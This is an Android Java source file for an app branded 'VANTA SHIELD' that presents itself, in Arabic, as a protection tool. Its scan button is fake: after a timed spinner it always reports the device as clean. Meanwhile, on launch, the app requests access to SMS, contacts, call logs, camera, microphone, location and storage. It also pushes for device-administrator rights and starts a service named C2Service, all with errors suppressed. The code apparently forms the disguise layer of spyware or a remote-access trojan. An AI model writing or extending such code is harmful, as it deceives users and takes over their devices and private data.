package com.vanta.core;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                             WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);

        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setGravity(Gravity.CENTER);
        l.setBackgroundColor(Color.parseColor("#080B10"));
        l.setPadding(50, 50, 50, 50);

        TextView title = new TextView(this);
        title.setText("🛡️ VANTA SHIELD");
        title.setTextColor(Color.parseColor("#00E5FF"));
        title.setTextSize(32);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        l.addView(title);

        TextView sub = new TextView(this);
        sub.setText("نظام الحماية المتقدم");
        sub.setTextColor(Color.parseColor("#8892B0"));
        sub.setTextSize(16);
        sub.setPadding(0, 0, 0, 40);
        l.addView(sub);

        final ProgressBar pb = new ProgressBar(this, null, android.R.attr.progressBarStyleLarge);
        pb.getIndeterminateDrawable().setColorFilter(Color.parseColor("#00E5FF"),
                android.graphics.PorterDuff.Mode.SRC_IN);
        pb.setVisibility(View.GONE);
        l.addView(pb);

        final TextView status = new TextView(this);
        status.setText("✔ النظام آمن");
        status.setTextColor(Color.parseColor("#00E676"));
        status.setTextSize(20);
        status.setGravity(Gravity.CENTER);
        status.setPadding(0, 40, 0, 40);
        l.addView(status);

        Button scan = new Button(this);
        scan.setText("بدء الفحص الشامل");
        scan.setTextColor(Color.BLACK);
        scan.setBackgroundColor(Color.parseColor("#00E5FF"));
        scan.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                status.setText("جاري فحص النظام...");
                status.setTextColor(Color.parseColor("#FFD600"));
                pb.setVisibility(View.VISIBLE);
                new Handler().postDelayed(new Runnable() {
                    public void run() {
                        pb.setVisibility(View.GONE);
                        status.setText("✔ النظام آمن ونظيف");
                        status.setTextColor(Color.parseColor("#00E676"));
                    }
                }, 3000);
            }
        });
        l.addView(scan);

        setContentView(l);

        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            }, 1);
        }

        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            if (!dpm.isAdminActive(cn)) {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                startActivity(i);
            }
        } catch (Exception e) {}

        try {
            Intent i = new Intent(this, C2Service.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
        } catch (Exception e) {}
    }
}
